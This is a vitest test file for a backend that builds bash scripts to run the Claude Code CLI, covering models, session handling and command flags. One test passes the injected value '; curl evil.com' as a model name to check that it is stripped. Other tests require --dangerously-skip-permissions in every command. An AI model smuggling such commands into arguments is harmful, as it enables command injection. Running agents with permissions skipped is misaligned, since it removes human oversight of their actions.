import { describe, it, expect, vi } from 'vitest';

vi.mock('./shared.js', async (importOriginal) => {
  const orig = await importOriginal() as any;
  return {
    ...orig,
    isCliInstalled: vi.fn(() => true),
    getCliVersion: vi.fn(() => '1.0.0'),
  };
});

import createClaudeCodeBackend from './claude-code.js';

describe('claude-code backend', () => {
  const backend = createClaudeCodeBackend();

  describe('factory', () => {
    it('returns backend with name claude-code', () => {
      expect(backend.name).toBe('claude-code');
    });

    it('returns backend with displayName Claude Code', () => {
      expect(backend.displayName).toBe('Claude Code');
    });

    it('has models: opus, sonnet, haiku', () => {
      expect(backend.models).toEqual(['opus', 'sonnet', 'haiku']);
    });

    it('has defaultModel: sonnet', () => {
      expect(backend.defaultModel).toBe('sonnet');
    });

    it('canResume is true', () => {
      expect(backend.canResume).toBe(true);
    });

    it('generateSessionId returns valid UUID', () => {
      const id = backend.generateSessionId();
      expect(id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i);
    });

    it('validateModel accepts valid models', () => {
      expect(backend.validateModel('sonnet')).toBe(true);
      expect(backend.validateModel('haiku')).toBe(true);
      expect(backend.validateModel('opus')).toBe(true);
    });

    it('validateModel rejects invalid models', () => {
      expect(backend.validateModel('gpt-4')).toBe(false);
    });

    it('capabilities.systemPrompt is true', () => {
      expect(backend.capabilities.systemPrompt).toBe(true);
    });

    it('capabilities.sessionPersistence is true', () => {
      expect(backend.capabilities.sessionPersistence).toBe(true);
    });
  });

  describe('buildCommand', () => {
    const baseOpts = {
      promptFile: '/tmp/test.prompt',
      sessionId: 'test-session-id',
      isResume: false,
      model: 'sonnet',
      systemPromptFile: '/tmp/test.sysprompt',
      streamParserScript: '/tmp/stream-display.js',
      agentId: 'abc123',
      tmpDir: '/tmp',
    };

    it('includes #!/bin/bash header', () => {
      const { script } = backend.buildCommand(baseOpts);
      expect(script).toContain('#!/bin/bash');
    });

    it('includes claude CLI invocation', () => {
      const { script } = backend.buildCommand(baseOpts);
      expect(script).toContain('claude -p');
    });

    it('includes --session-id for new sessions', () => {
      const { script } = backend.buildCommand(baseOpts);
      expect(script).toContain('--session-id test-session-id');
    });

    it('includes --resume for resumed sessions', () => {
      const { script } = backend.buildCommand({ ...baseOpts, isResume: true });
      expect(script).toContain('--resume test-session-id');
    });

    it('excludes --system-prompt on resume', () => {
      const { script } = backend.buildCommand({ ...baseOpts, isResume: true });
      expect(script).not.toContain('--system-prompt');
    });

    it('includes --model flag', () => {
      const { script } = backend.buildCommand(baseOpts);
      expect(script).toContain('--model sonnet');
    });

    it('includes --output-format stream-json', () => {
      const { script } = backend.buildCommand(baseOpts);
      expect(script).toContain('--output-format stream-json');
    });

    it('includes --dangerously-skip-permissions', () => {
      const { script } = backend.buildCommand(baseOpts);
      expect(script).toContain('--dangerously-skip-permissions');
    });

    it('includes cd to cwd when provided', () => {
      const { script } = backend.buildCommand({ ...baseOpts, cwd: '/projects/repo' });
      expect(script).toContain('cd "/projects/repo"');
    });

    it('includes mcp config when provided', () => {
      const { script } = backend.buildCommand({ ...baseOpts, mcpConfigFile: '/tmp/mcp.json' });
      expect(script).toContain('--mcp-config');
    });

    it('strips unsafe model values from command', () => {
      const { script } = backend.buildCommand({ ...baseOpts, model: '; curl evil.com' });
      expect(script).not.toContain('; curl evil.com');
    });
  });
});
